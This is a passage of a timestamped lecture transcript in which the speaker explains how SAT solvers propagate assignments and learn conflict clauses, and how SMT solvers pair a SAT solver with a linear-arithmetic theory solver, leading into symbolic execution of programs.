            <slice>
              <time_slice>34:55</time_slice>
              <text_slice>So people can see what it says.</text_slice>
            </slice>
            <slice>
              <time_slice>34:57</time_slice>
              <text_slice>So what we have
here in SAT problem</text_slice>
            </slice>
            <slice>
              <time_slice>35:01</time_slice>
              <text_slice>is that we have all these
variables that represent</text_slice>
            </slice>
            <slice>
              <time_slice>35:06</time_slice>
              <text_slice>Boolean unknowns, right?</text_slice>
            </slice>
            <slice>
              <time_slice>35:08</time_slice>
              <text_slice>We want to know is
it possible for x</text_slice>
            </slice>
            <slice>
              <time_slice>35:11</time_slice>
              <text_slice>to be true, and y to be true,
and z to be true at the same,</text_slice>
            </slice>
            <slice>
              <time_slice>35:15</time_slice>
              <text_slice>for example.</text_slice>
            </slice>
            <slice>
              <time_slice>35:15</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>35:16</time_slice>
              <text_slice>And these are our unknowns.</text_slice>
            </slice>
            <slice>
              <time_slice>35:18</time_slice>
              <text_slice>And all the constraints are
in conjunctive normal form.</text_slice>
            </slice>
            <slice>
              <time_slice>35:22</time_slice>
              <text_slice>What that means is
all our constraints</text_slice>
            </slice>
            <slice>
              <time_slice>35:24</time_slice>
              <text_slice>are of the form either x1
is true, or x2 is true,</text_slice>
            </slice>
            <slice>
              <time_slice>35:33</time_slice>
              <text_slice>or x3 is true, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>35:37</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>35:38</time_slice>
              <text_slice>So what we have is we have all
our constraints in this form</text_slice>
            </slice>
            <slice>
              <time_slice>35:42</time_slice>
              <text_slice>and some of them might say,
well, either x1 is true,</text_slice>
            </slice>
            <slice>
              <time_slice>35:45</time_slice>
              <text_slice>or x2 is false, or x3 is false.</text_slice>
            </slice>
            <slice>
              <time_slice>35:48</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>35:49</time_slice>
              <text_slice>So we have constraints.</text_slice>
            </slice>
            <slice>
              <time_slice>35:50</time_slice>
              <text_slice>All our constraints
are of this form.</text_slice>
            </slice>
            <slice>
              <time_slice>35:53</time_slice>
              <text_slice>And you probably remember
from discrete math</text_slice>
            </slice>
            <slice>
              <time_slice>35:55</time_slice>
              <text_slice>that any Boolean formula
can be represented</text_slice>
            </slice>
            <slice>
              <time_slice>35:59</time_slice>
              <text_slice>in conjunctive normal form.</text_slice>
            </slice>
            <slice>
              <time_slice>36:01</time_slice>
              <text_slice>And it has the added benefit
that it's actually very, very</text_slice>
            </slice>
            <slice>
              <time_slice>36:03</time_slice>
              <text_slice>easy to translate from arbitrary
representations of a formula</text_slice>
            </slice>
            <slice>
              <time_slice>36:08</time_slice>
              <text_slice>to these conjunctive normal form
formula, which means whatever</text_slice>
            </slice>
            <slice>
              <time_slice>36:11</time_slice>
              <text_slice>representation you're using
to represent Boolean formulas,</text_slice>
            </slice>
            <slice>
              <time_slice>36:15</time_slice>
              <text_slice>you can very easily
convert it to this format.</text_slice>
            </slice>
            <slice>
              <time_slice>36:19</time_slice>
              <text_slice>So what we have is
we have a database</text_slice>
            </slice>
            <slice>
              <time_slice>36:22</time_slice>
              <text_slice>with lots of constraints
of this form.</text_slice>
            </slice>
            <slice>
              <time_slice>36:25</time_slice>
              <text_slice>And what SAT solver
is going to do</text_slice>
            </slice>
            <slice>
              <time_slice>36:27</time_slice>
              <text_slice>is going to pick one of
these variables at random.</text_slice>
            </slice>
            <slice>
              <time_slice>36:29</time_slice>
              <text_slice>Let's say it's going to pick x1.</text_slice>
            </slice>
            <slice>
              <time_slice>36:31</time_slice>
              <text_slice>And it's going to say, why
don't we set x1 to true?</text_slice>
            </slice>
            <slice>
              <time_slice>36:36</time_slice>
              <text_slice>I don't know anything
about this problem.</text_slice>
            </slice>
            <slice>
              <time_slice>36:38</time_slice>
              <text_slice>Might as well try
selling it to true.</text_slice>
            </slice>
            <slice>
              <time_slice>36:41</time_slice>
              <text_slice>And then what will happen is
you'll have some constraints</text_slice>
            </slice>
            <slice>
              <time_slice>36:44</time_slice>
              <text_slice>that mention x1 and let's say
that you have a constraint that</text_slice>
            </slice>
            <slice>
              <time_slice>36:48</time_slice>
              <text_slice>says either x1 is
false or x7 is true.</text_slice>
            </slice>
            <slice>
              <time_slice>36:53</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>36:53</time_slice>
              <text_slice>So if you know that
x1 is true and you</text_slice>
            </slice>
            <slice>
              <time_slice>36:56</time_slice>
              <text_slice>know that either x1 is
false or x7 is true,</text_slice>
            </slice>
            <slice>
              <time_slice>37:00</time_slice>
              <text_slice>what do you know about x7?</text_slice>
            </slice>
            <slice>
              <time_slice>37:04</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>37:05</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>37:06</time_slice>
              <text_slice>It has to be true.</text_slice>
            </slice>
            <slice>
              <time_slice>37:06</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>37:07</time_slice>
              <text_slice>Because otherwise
this constraint</text_slice>
            </slice>
            <slice>
              <time_slice>37:09</time_slice>
              <text_slice>would not be satisfied.</text_slice>
            </slice>
            <slice>
              <time_slice>37:10</time_slice>
              <text_slice>And so now you've propagated
this assignment from x1 to x7.</text_slice>
            </slice>
            <slice>
              <time_slice>37:16</time_slice>
              <text_slice>And let's say now you pick
some other random variable.</text_slice>
            </slice>
            <slice>
              <time_slice>37:19</time_slice>
              <text_slice>You say, well, what about x5?</text_slice>
            </slice>
            <slice>
              <time_slice>37:22</time_slice>
              <text_slice>Why don't we try x5 being true?</text_slice>
            </slice>
            <slice>
              <time_slice>37:24</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>37:24</time_slice>
              <text_slice>And now let's say that you
have a constraint that says,</text_slice>
            </slice>
            <slice>
              <time_slice>37:27</time_slice>
              <text_slice>well, either x7 is false, or
x6 is true, or x5 is false.</text_slice>
            </slice>
            <slice>
              <time_slice>37:41</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>37:42</time_slice>
              <text_slice>So I have x5 being true
and I have x7 being true.</text_slice>
            </slice>
            <slice>
              <time_slice>37:48</time_slice>
              <text_slice>So that means x6
now has to be true.</text_slice>
            </slice>
            <slice>
              <time_slice>37:52</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>37:53</time_slice>
              <text_slice>Because otherwise this
constraint would be violated.</text_slice>
            </slice>
            <slice>
              <time_slice>37:56</time_slice>
              <text_slice>And so from that the
system infers, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>37:59</time_slice>
              <text_slice>So x6 has to be true.</text_slice>
            </slice>
            <slice>
              <time_slice>38:01</time_slice>
              <text_slice>And it keeps at this
process essentially</text_slice>
            </slice>
            <slice>
              <time_slice>38:04</time_slice>
              <text_slice>trying out assignments.</text_slice>
            </slice>
            <slice>
              <time_slice>38:06</time_slice>
              <text_slice>And then looking at all
the available clauses,</text_slice>
            </slice>
            <slice>
              <time_slice>38:09</time_slice>
              <text_slice>and looking at,
hey, are there are</text_slice>
            </slice>
            <slice>
              <time_slice>38:10</time_slice>
              <text_slice>other things that are
implied by the assignments</text_slice>
            </slice>
            <slice>
              <time_slice>38:14</time_slice>
              <text_slice>that I have so far?</text_slice>
            </slice>
            <slice>
              <time_slice>38:16</time_slice>
              <text_slice>And following those implications
until one of two things</text_slice>
            </slice>
            <slice>
              <time_slice>38:20</time_slice>
              <text_slice>happens.</text_slice>
            </slice>
            <slice>
              <time_slice>38:20</time_slice>
              <text_slice>Either you keep following
implications and trying</text_slice>
            </slice>
            <slice>
              <time_slice>38:23</time_slice>
              <text_slice>random things and eventually
you have set a value</text_slice>
            </slice>
            <slice>
              <time_slice>38:26</time_slice>
              <text_slice>to every single
variable without ever</text_slice>
            </slice>
            <slice>
              <time_slice>38:28</time_slice>
              <text_slice>running into a contradiction.</text_slice>
            </slice>
            <slice>
              <time_slice>38:30</time_slice>
              <text_slice>And then you're done.</text_slice>
            </slice>
            <slice>
              <time_slice>38:32</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>38:33</time_slice>
              <text_slice>You found a satisfying
assignment, or what can happen</text_slice>
            </slice>
            <slice>
              <time_slice>38:37</time_slice>
              <text_slice>is you run into a contradiction.</text_slice>
            </slice>
            <slice>
              <time_slice>38:38</time_slice>
              <text_slice>You run into a place where there
was a clause that forced x4</text_slice>
            </slice>
            <slice>
              <time_slice>38:45</time_slice>
              <text_slice>to be true, except there was
another clause that forced x4</text_slice>
            </slice>
            <slice>
              <time_slice>38:49</time_slice>
              <text_slice>to be false.</text_slice>
            </slice>
            <slice>
              <time_slice>38:50</time_slice>
              <text_slice>And if there's one rule of
Boolean algebra that everybody</text_slice>
            </slice>
            <slice>
              <time_slice>38:55</time_slice>
              <text_slice>should know, is that you cannot
have a variable be true and be</text_slice>
            </slice>
            <slice>
              <time_slice>38:58</time_slice>
              <text_slice>false at the same time.</text_slice>
            </slice>
            <slice>
              <time_slice>38:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>39:00</time_slice>
              <text_slice>And so what that
tells you is you've</text_slice>
            </slice>
            <slice>
              <time_slice>39:01</time_slice>
              <text_slice>run into a contradiction.</text_slice>
            </slice>
            <slice>
              <time_slice>39:03</time_slice>
              <text_slice>You clearly did
something wrong in one</text_slice>
            </slice>
            <slice>
              <time_slice>39:05</time_slice>
              <text_slice>of these random assignments
that you were trying.</text_slice>
            </slice>
            <slice>
              <time_slice>39:08</time_slice>
              <text_slice>So now let's analyze
this contradiction.</text_slice>
            </slice>
            <slice>
              <time_slice>39:10</time_slice>
              <text_slice>Let's figure out what
were the assignments that</text_slice>
            </slice>
            <slice>
              <time_slice>39:12</time_slice>
              <text_slice>led to this contradiction.</text_slice>
            </slice>
            <slice>
              <time_slice>39:16</time_slice>
              <text_slice>And based on the assignments
that led to that contradiction,</text_slice>
            </slice>
            <slice>
              <time_slice>39:20</time_slice>
              <text_slice>let's come up with a
new conflict clause that</text_slice>
            </slice>
            <slice>
              <time_slice>39:25</time_slice>
              <text_slice>summarizes that contradiction.</text_slice>
            </slice>
            <slice>
              <time_slice>39:27</time_slice>
              <text_slice>So in this case,
what would happen</text_slice>
            </slice>
            <slice>
              <time_slice>39:31</time_slice>
              <text_slice>is that you have x1 being
false, and x5 being false.</text_slice>
            </slice>
            <slice>
              <time_slice>39:38</time_slice>
              <text_slice>And x9 being false, right?</text_slice>
            </slice>
            <slice>
              <time_slice>39:41</time_slice>
              <text_slice>So essentially what this is
saying is that based on what I</text_slice>
            </slice>
            <slice>
              <time_slice>39:44</time_slice>
              <text_slice>learned from these random
assignments I discovered that</text_slice>
            </slice>
            <slice>
              <time_slice>39:46</time_slice>
              <text_slice>one of these things
has to be true,</text_slice>
            </slice>
            <slice>
              <time_slice>39:49</time_slice>
              <text_slice>that it cannot be the case that
x1 is true, and x5 is true,</text_slice>
            </slice>
            <slice>
              <time_slice>39:53</time_slice>
              <text_slice>and x9 is false.</text_slice>
            </slice>
            <slice>
              <time_slice>39:55</time_slice>
              <text_slice>That cannot happen.</text_slice>
            </slice>
            <slice>
              <time_slice>39:57</time_slice>
              <text_slice>And I know that cannot happen
because when I tried that</text_slice>
            </slice>
            <slice>
              <time_slice>40:00</time_slice>
              <text_slice>things blew up.</text_slice>
            </slice>
            <slice>
              <time_slice>40:00</time_slice>
              <text_slice>I ended up with a contradiction.</text_slice>
            </slice>
            <slice>
              <time_slice>40:03</time_slice>
              <text_slice>And so what SAT solver is doing
is trying random assignments,</text_slice>
            </slice>
            <slice>
              <time_slice>40:06</time_slice>
              <text_slice>propagating them through.</text_slice>
            </slice>
            <slice>
              <time_slice>40:08</time_slice>
              <text_slice>When it runs into
contradictions it's</text_slice>
            </slice>
            <slice>
              <time_slice>40:09</time_slice>
              <text_slice>analyzing the set
of implications</text_slice>
            </slice>
            <slice>
              <time_slice>40:12</time_slice>
              <text_slice>that led to that contradiction.</text_slice>
            </slice>
            <slice>
              <time_slice>40:14</time_slice>
              <text_slice>And summarising that in
a new constraint that</text_slice>
            </slice>
            <slice>
              <time_slice>40:17</time_slice>
              <text_slice>will make sure
that it never runs</text_slice>
            </slice>
            <slice>
              <time_slice>40:19</time_slice>
              <text_slice>into this contradiction
again, that it never</text_slice>
            </slice>
            <slice>
              <time_slice>40:21</time_slice>
              <text_slice>runs into this
particular problem again.</text_slice>
            </slice>
            <slice>
              <time_slice>40:25</time_slice>
              <text_slice>Other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>40:34</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>40:35</time_slice>
              <text_slice>So so far so good.</text_slice>
            </slice>
            <slice>
              <time_slice>40:36</time_slice>
              <text_slice>So we can't really
think of the SAT solver</text_slice>
            </slice>
            <slice>
              <time_slice>40:40</time_slice>
              <text_slice>as just a black box that
given a Boolean constraint</text_slice>
            </slice>
            <slice>
              <time_slice>40:43</time_slice>
              <text_slice>it can either say, no,
this Boolean constraint is</text_slice>
            </slice>
            <slice>
              <time_slice>40:47</time_slice>
              <text_slice>unsatisfiable, or it
can say, yeah, here's</text_slice>
            </slice>
            <slice>
              <time_slice>40:51</time_slice>
              <text_slice>a satisfying assignment to
that Boolean constraint.</text_slice>
            </slice>
            <slice>
              <time_slice>40:53</time_slice>
              <text_slice>So SMT solvers are built
on top of SAT solvers.</text_slice>
            </slice>
            <slice>
              <time_slice>40:57</time_slice>
              <text_slice>And what they're
able to do is they're</text_slice>
            </slice>
            <slice>
              <time_slice>40:58</time_slice>
              <text_slice>able to combine the
power of the SAT solver</text_slice>
            </slice>
            <slice>
              <time_slice>41:01</time_slice>
              <text_slice>to solve these NP-complete
SAT problems with domain</text_slice>
            </slice>
            <slice>
              <time_slice>41:08</time_slice>
              <text_slice>specific reasoning to reason
about the different theories</text_slice>
            </slice>
            <slice>
              <time_slice>41:12</time_slice>
              <text_slice>that are supported.</text_slice>
            </slice>
            <slice>
              <time_slice>41:13</time_slice>
              <text_slice>So to give you an
idea of how it works,</text_slice>
            </slice>
            <slice>
              <time_slice>41:15</time_slice>
              <text_slice>and this is going to
be a fairly high level,</text_slice>
            </slice>
            <slice>
              <time_slice>41:18</time_slice>
              <text_slice>but to give you
an idea of how it</text_slice>
            </slice>
            <slice>
              <time_slice>41:19</time_slice>
              <text_slice>works let's say that you have
a formula like this, right?</text_slice>
            </slice>
            <slice>
              <time_slice>41:22</time_slice>
              <text_slice>So you say x is greater
than 5 and y is less than 5.</text_slice>
            </slice>
            <slice>
              <time_slice>41:28</time_slice>
              <text_slice>And either y is greater than
x or y is greater than 2.</text_slice>
            </slice>
            <slice>
              <time_slice>41:33</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>41:34</time_slice>
              <text_slice>So is that satisfiable?</text_slice>
            </slice>
            <slice>
              <time_slice>41:37</time_slice>
              <text_slice>Can we find a satisfying
assignment for that?</text_slice>
            </slice>
            <slice>
              <time_slice>41:39</time_slice>
              <text_slice>So what an SMT solver can
do is separate out the part</text_slice>
            </slice>
            <slice>
              <time_slice>41:46</time_slice>
              <text_slice>of this formula that requires
domain reasoning, that</text_slice>
            </slice>
            <slice>
              <time_slice>41:50</time_slice>
              <text_slice>requires reasoning in
the theory, in this case,</text_slice>
            </slice>
            <slice>
              <time_slice>41:52</time_slice>
              <text_slice>of integers.</text_slice>
            </slice>
            <slice>
              <time_slice>41:54</time_slice>
              <text_slice>With the part of
this formula that</text_slice>
            </slice>
            <slice>
              <time_slice>41:55</time_slice>
              <text_slice>is just the Boolean structure.</text_slice>
            </slice>
            <slice>
              <time_slice>41:57</time_slice>
              <text_slice>So if you separate the
Boolean structure here,</text_slice>
            </slice>
            <slice>
              <time_slice>42:01</time_slice>
              <text_slice>essentially what
you're saying is</text_slice>
            </slice>
            <slice>
              <time_slice>42:02</time_slice>
              <text_slice>that there's some formula,
F1 and some formula F2,</text_slice>
            </slice>
            <slice>
              <time_slice>42:09</time_slice>
              <text_slice>and either F3 or F4.</text_slice>
            </slice>
            <slice>
              <time_slice>42:11</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>42:12</time_slice>
              <text_slice>And now this is a purely
Boolean problem, right?</text_slice>
            </slice>
            <slice>
              <time_slice>42:15</time_slice>
              <text_slice>It's just a problem of
can I find a satisfying</text_slice>
            </slice>
            <slice>
              <time_slice>42:18</time_slice>
              <text_slice>assignment for that?</text_slice>
            </slice>
            <slice>
              <time_slice>42:22</time_slice>
              <text_slice>Is there a satisfying
assignment for that?</text_slice>
            </slice>
            <slice>
              <time_slice>42:24</time_slice>
              <text_slice>And, again, this is
just a Boolean formula.</text_slice>
            </slice>
            <slice>
              <time_slice>42:26</time_slice>
              <text_slice>Goes to a SAT solver and the
SAT solver can say, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>42:33</time_slice>
              <text_slice>I can find a satisfying
assignment for this.</text_slice>
            </slice>
            <slice>
              <time_slice>42:36</time_slice>
              <text_slice>And I can find a
satisfying assignment</text_slice>
            </slice>
            <slice>
              <time_slice>42:39</time_slice>
              <text_slice>by making this true, and
this true, and this true.</text_slice>
            </slice>
            <slice>
              <time_slice>42:43</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>42:44</time_slice>
              <text_slice>It's a satisfying assignment
for the Boolean formula.</text_slice>
            </slice>
            <slice>
              <time_slice>42:48</time_slice>
              <text_slice>So now we have a question
that we can go and ask</text_slice>
            </slice>
            <slice>
              <time_slice>42:52</time_slice>
              <text_slice>the domain specific solver.</text_slice>
            </slice>
            <slice>
              <time_slice>42:54</time_slice>
              <text_slice>In this case just a
linear arithmetic solver.</text_slice>
            </slice>
            <slice>
              <time_slice>42:59</time_slice>
              <text_slice>So we can go to
the linear solver</text_slice>
            </slice>
            <slice>
              <time_slice>43:01</time_slice>
              <text_slice>and say, hey, so the
SAT solver claims</text_slice>
            </slice>
            <slice>
              <time_slice>43:04</time_slice>
              <text_slice>that this is a reasonable
assignment, that if I</text_slice>
            </slice>
            <slice>
              <time_slice>43:06</time_slice>
              <text_slice>can make that
assignment work, then</text_slice>
            </slice>
            <slice>
              <time_slice>43:08</time_slice>
              <text_slice>my formula will be satisfied.</text_slice>
            </slice>
            <slice>
              <time_slice>43:10</time_slice>
              <text_slice>So I can go and say, well F1 was
actually this, and F2 was this,</text_slice>
            </slice>
            <slice>
              <time_slice>43:17</time_slice>
              <text_slice>and F3 was this.</text_slice>
            </slice>
            <slice>
              <time_slice>43:18</time_slice>
              <text_slice>So I can ask a theory solver, is
it possible to get an x and a y</text_slice>
            </slice>
            <slice>
              <time_slice>43:22</time_slice>
              <text_slice>such that x is greater
than 5, y is less than 5,</text_slice>
            </slice>
            <slice>
              <time_slice>43:26</time_slice>
              <text_slice>and y is greater than x?</text_slice>
            </slice>
            <slice>
              <time_slice>43:28</time_slice>
              <text_slice>Right, so now this is a question
purely about linear arithmetic.</text_slice>
            </slice>
            <slice>
              <time_slice>43:32</time_slice>
              <text_slice>There's no Boolean
logic involved.</text_slice>
            </slice>
            <slice>
              <time_slice>43:36</time_slice>
              <text_slice>And what's the answer?</text_slice>
            </slice>
            <slice>
              <time_slice>43:39</time_slice>
              <text_slice>No.</text_slice>
            </slice>
            <slice>
              <time_slice>43:40</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>43:40</time_slice>
              <text_slice>And there are
traditional methods</text_slice>
            </slice>
            <slice>
              <time_slice>43:44</time_slice>
              <text_slice>to solve these kinds
of your problems.</text_slice>
            </slice>
            <slice>
              <time_slice>43:47</time_slice>
              <text_slice>You could use the simplex
method, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>43:50</time_slice>
              <text_slice>to solve systems of
linear inequalities.</text_slice>
            </slice>
            <slice>
              <time_slice>43:53</time_slice>
              <text_slice>There's lots of
methods that you can</text_slice>
            </slice>
            <slice>
              <time_slice>43:55</time_slice>
              <text_slice>use to solve systems
of linear inequalities.</text_slice>
            </slice>
            <slice>
              <time_slice>43:57</time_slice>
              <text_slice>The point is the theory solver
knows about all of those.</text_slice>
            </slice>
            <slice>
              <time_slice>44:00</time_slice>
              <text_slice>And the theory
solver can say, no.</text_slice>
            </slice>
            <slice>
              <time_slice>44:03</time_slice>
              <text_slice>This will not work.</text_slice>
            </slice>
            <slice>
              <time_slice>44:04</time_slice>
              <text_slice>This is an assignment
that will not work.</text_slice>
            </slice>
            <slice>
              <time_slice>44:07</time_slice>
              <text_slice>And so the theory solver can
now go back to the SAT solver</text_slice>
            </slice>
            <slice>
              <time_slice>44:13</time_slice>
              <text_slice>and not just tell the SAT
solver, hey, that thing</text_slice>
            </slice>
            <slice>
              <time_slice>44:15</time_slice>
              <text_slice>that you did, that didn't work.</text_slice>
            </slice>
            <slice>
              <time_slice>44:18</time_slice>
              <text_slice>But it can also give
more of an explanation.</text_slice>
            </slice>
            <slice>
              <time_slice>44:20</time_slice>
              <text_slice>So in this case, what you can
conclude from the fact that</text_slice>
            </slice>
            <slice>
              <time_slice>44:24</time_slice>
              <text_slice>this didn't work is that
actually in addition</text_slice>
            </slice>
            <slice>
              <time_slice>44:26</time_slice>
              <text_slice>to satisfying this formula you
also want to satisfy the fact</text_slice>
            </slice>
            <slice>
              <time_slice>44:31</time_slice>
              <text_slice>that I cannot have F1,
and F2, and F3, right?</text_slice>
            </slice>
            <slice>
              <time_slice>44:40</time_slice>
              <text_slice>My theory solver has
told me that these three</text_slice>
            </slice>
            <slice>
              <time_slice>44:42</time_slice>
              <text_slice>things are mutually exclusive.</text_slice>
            </slice>
            <slice>
              <time_slice>44:44</time_slice>
              <text_slice>I cannot satisfy all
three of them together.</text_slice>
            </slice>
            <slice>
              <time_slice>44:47</time_slice>
              <text_slice>And so now that's a
piece of information</text_slice>
            </slice>
            <slice>
              <time_slice>44:49</time_slice>
              <text_slice>that I can go back
to the SAT solver</text_slice>
            </slice>
            <slice>
              <time_slice>44:52</time_slice>
              <text_slice>and ask the SAT
solver, hey, can you</text_slice>
            </slice>
            <slice>
              <time_slice>44:54</time_slice>
              <text_slice>give me a solution
that satisfies</text_slice>
            </slice>
            <slice>
              <time_slice>44:57</time_slice>
              <text_slice>not only the constraint that
you had in the beginning,</text_slice>
            </slice>
            <slice>
              <time_slice>44:59</time_slice>
              <text_slice>but also this new
constraint that the theory</text_slice>
            </slice>
            <slice>
              <time_slice>45:03</time_slice>
              <text_slice>solver discovered?</text_slice>
            </slice>
            <slice>
              <time_slice>45:05</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>45:05</time_slice>
              <text_slice>So now is there some other
assignment that satisfies now</text_slice>
            </slice>
            <slice>
              <time_slice>45:09</time_slice>
              <text_slice>both of these constraints?</text_slice>
            </slice>
            <slice>
              <time_slice>45:18</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>45:21</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>45:23</time_slice>
              <text_slice>So there's an assignment
where this becomes false.</text_slice>
            </slice>
            <slice>
              <time_slice>45:25</time_slice>
              <text_slice>And this becomes true.</text_slice>
            </slice>
            <slice>
              <time_slice>45:27</time_slice>
              <text_slice>And that's an assignment
that satisfies</text_slice>
            </slice>
            <slice>
              <time_slice>45:29</time_slice>
              <text_slice>the constraint on the top.</text_slice>
            </slice>
            <slice>
              <time_slice>45:30</time_slice>
              <text_slice>It satisfies the
constraint on the bottom.</text_slice>
            </slice>
            <slice>
              <time_slice>45:32</time_slice>
              <text_slice>And so once again
that's an assignment</text_slice>
            </slice>
            <slice>
              <time_slice>45:34</time_slice>
              <text_slice>that leads to a new constraint.</text_slice>
            </slice>
            <slice>
              <time_slice>45:37</time_slice>
              <text_slice>So this constraint
now goes away.</text_slice>
            </slice>
            <slice>
              <time_slice>45:39</time_slice>
              <text_slice>We don't care about it any more.</text_slice>
            </slice>
            <slice>
              <time_slice>45:40</time_slice>
              <text_slice>We have a new constraint that we
can ask our theory solver, hey,</text_slice>
            </slice>
            <slice>
              <time_slice>45:44</time_slice>
              <text_slice>it this possible?</text_slice>
            </slice>
            <slice>
              <time_slice>45:46</time_slice>
              <text_slice>And in this case the
theory solver says, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>45:48</time_slice>
              <text_slice>That actually is possible.</text_slice>
            </slice>
            <slice>
              <time_slice>45:50</time_slice>
              <text_slice>You can make y equal
3 and x equal 6.</text_slice>
            </slice>
            <slice>
              <time_slice>45:57</time_slice>
              <text_slice>And it works.</text_slice>
            </slice>
            <slice>
              <time_slice>45:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>45:59</time_slice>
              <text_slice>And so now you
have an assignment</text_slice>
            </slice>
            <slice>
              <time_slice>46:02</time_slice>
              <text_slice>that satisfies the
formula in the theory</text_slice>
            </slice>
            <slice>
              <time_slice>46:07</time_slice>
              <text_slice>and that satisfies
the Boolean structure</text_slice>
            </slice>
            <slice>
              <time_slice>46:11</time_slice>
              <text_slice>behind this assignment.</text_slice>
            </slice>
            <slice>
              <time_slice>46:12</time_slice>
              <text_slice>And with that the system can
come back and tell you, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>46:15</time_slice>
              <text_slice>Here's an assignment that
satisfies all your constraints.</text_slice>
            </slice>
            <slice>
              <time_slice>46:19</time_slice>
              <text_slice>And so it's this
interaction back and forth</text_slice>
            </slice>
            <slice>
              <time_slice>46:21</time_slice>
              <text_slice>between the theory solver
and the SAT solver.</text_slice>
            </slice>
            <slice>
              <time_slice>46:25</time_slice>
              <text_slice>And really the ability
to be able to reason</text_slice>
            </slice>
            <slice>
              <time_slice>46:27</time_slice>
              <text_slice>about very, very large and very
complicated Boolean formulas.</text_slice>
            </slice>
            <slice>
              <time_slice>46:31</time_slice>
              <text_slice>That's what makes symbolic
execution possible.</text_slice>
            </slice>
            <slice>
              <time_slice>46:36</time_slice>
              <text_slice>So now that we have that
the next question is,</text_slice>
            </slice>
            <slice>
              <time_slice>46:41</time_slice>
              <text_slice>so how do we go from a
program to a constraint</text_slice>
            </slice>
            <slice>
              <time_slice>46:52</time_slice>
              <text_slice>that we can give
to an SMT solver?</text_slice>
            </slice>
            <slice>
              <time_slice>46:54</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>46:54</time_slice>
              <text_slice>AUDIENCE: Sorry for going back.</text_slice>
            </slice>
            <slice>
              <time_slice>46:56</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Sure.</text_slice>
            </slice>
            <slice>
              <time_slice>46:57</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]
previously.</text_slice>
            </slice>
            <slice>
              <time_slice>46:58</time_slice>
              <text_slice>But could you run me again the
whole issue of constructing</text_slice>
            </slice>
            <slice>
              <time_slice>47:05</time_slice>
              <text_slice>the SMT statements?</text_slice>
            </slice>
            <slice>
              <time_slice>47:07</time_slice>
              <text_slice>Is it an NP-complete or
is it not? [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>47:10</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA:
So the problems</text_slice>
            </slice>
            <slice>
              <time_slice>47:12</time_slice>
              <text_slice>that the SMT
solvers are solving,</text_slice>
            </slice>
            <slice>
              <time_slice>47:15</time_slice>
              <text_slice>those are NP-complete
problems in the best of cases.</text_slice>
            </slice>
            <slice>
              <time_slice>47:20</time_slice>
              <text_slice>So SAT itself is the
canonical NP-complete problem,</text_slice>
            </slice>
            <slice>
              <time_slice>47:24</time_slice>
              <text_slice>but a lot of solvers these
days even include support</text_slice>
            </slice>
            <slice>
              <time_slice>47:28</time_slice>
              <text_slice>for some theories that
are outright undecidable.</text_slice>
            </slice>
            <slice>
              <time_slice>47:34</time_slice>
              <text_slice>So--</text_slice>
            </slice>
            <slice>
              <time_slice>47:35</time_slice>
              <text_slice>AUDIENCE: So how do you
approach that in your system?</text_slice>
            </slice>
            <slice>
              <time_slice>47:39</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: Well, at
the end of the day what you get</text_slice>
            </slice>
            <slice>
              <time_slice>47:42</time_slice>
              <text_slice>is you're going to create a
constraint from this program.</text_slice>
            </slice>
            <slice>
              <time_slice>47:48</time_slice>
              <text_slice>You're going to give
it to the SMT solver.</text_slice>
            </slice>
            <slice>
              <time_slice>47:51</time_slice>
              <text_slice>And the fact that these
are NP-complete problems,</text_slice>
            </slice>
            <slice>
              <time_slice>47:54</time_slice>
              <text_slice>or the fact that they're
unsatisfiable, what it means</text_slice>
            </slice>
            <slice>
              <time_slice>47:56</time_slice>
              <text_slice>is that if you're lucky, you
will get an answer in seconds.</text_slice>
            </slice>
            <slice>
              <time_slice>48:03</time_slice>
              <text_slice>And if you're not
lucky, then it might</text_slice>
            </slice>
            <slice>
              <time_slice>48:06</time_slice>
              <text_slice>take longer than the age of
the universe for the thing</text_slice>
            </slice>
            <slice>
              <time_slice>48:09</time_slice>
              <text_slice>to give you an answer.</text_slice>
            </slice>
            <slice>
              <time_slice>48:11</time_slice>
              <text_slice>AUDIENCE: OK.</text_slice>
            </slice>
            <slice>
              <time_slice>48:11</time_slice>
              <text_slice>How often do you run into
cases where your system just</text_slice>
            </slice>
            <slice>
